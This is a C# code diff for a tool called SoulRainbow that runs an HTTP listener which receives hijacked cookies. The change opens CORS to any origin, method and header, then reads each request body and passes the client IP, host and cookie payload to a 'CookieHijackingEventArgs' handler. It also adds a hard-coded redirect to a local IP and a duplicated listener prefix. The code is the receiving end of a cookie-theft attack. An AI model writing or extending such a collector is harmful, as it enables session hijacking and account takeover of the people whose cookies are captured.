@@ -41,6 +41,7 @@ namespace SoulRainbow
             //setting prefixes for http
             listener.Prefixes.Add("http://*:" + port + "/");
             listener.Prefixes.Add("https://*:8443/");
+            listener.Prefixes.Add("https://*:8443/");
             //listener.Prefixes.Add("http://*:80/");
 
             listener.Start();
@@ -74,6 +75,8 @@ namespace SoulRainbow
                     //Enables CORS to be able to recive GET to transfer XML files
                     //TODO: when we have a domain change '*' to 'www.domain.com'
                     context.Response.AppendHeader("Access-Control-Allow-Origin", "*");
+                    context.Response.AppendHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE");
+                    context.Response.AppendHeader("Access-Control-Allow-Headers", "*");
 
 
                     //send the request to be displayed in the program connections list
@@ -81,12 +84,16 @@ namespace SoulRainbow
                     {
                         string accessControlHeader = context.Request.Headers.Get("Access-Control-Request-Headers");
 
-                        if (accessControlHeader.Contains("soulrainbow|cookies"))
-                        {
+                        if (context.Request.HasEntityBody) {
+                            Stream StreamBody = context.Request.InputStream;
+                            Encoding encoding = context.Request.ContentEncoding;
+                            StreamReader reader = new StreamReader(StreamBody, encoding);
+                            
                             var data = new CookieHijackingEventArgs();
                             data.ClientIP = context.Request.UserHostAddress;
                             data.Domain = context.Request.UserHostName;
-                            data.AdditionalInfo = accessControlHeader;
+                            data.AdditionalInfo = accessControlHeader + " body: " + reader.ReadToEnd();
+                            OnCookieRecieved(data);
                         }
                         else if (accessControlHeader.Contains("soulrainbow|xml"))
                         {
@@ -116,7 +123,7 @@ namespace SoulRainbow
                 else
                 {
                     //in case if the url dont include the virtual directory root folder redirects by default to them 
-                    //context.Response.Redirect(@"http://192.168.1.229:8443/index");
+                    context.Response.Redirect(@"http://192.168.1.229:8443/index");
                     context.Response.Close();
 
                 }
@@ -132,6 +139,11 @@ namespace SoulRainbow
         protected virtual void OnClientRecieved(ProcessEventArgs e)
         {
             clientRecieved?.Invoke(this, e);
+        }
+
+        protected virtual void OnCookieRecieved(CookieHijackingEventArgs e)
+        {
+            CookieRecieved?.Invoke(this, e);
         }
 
         
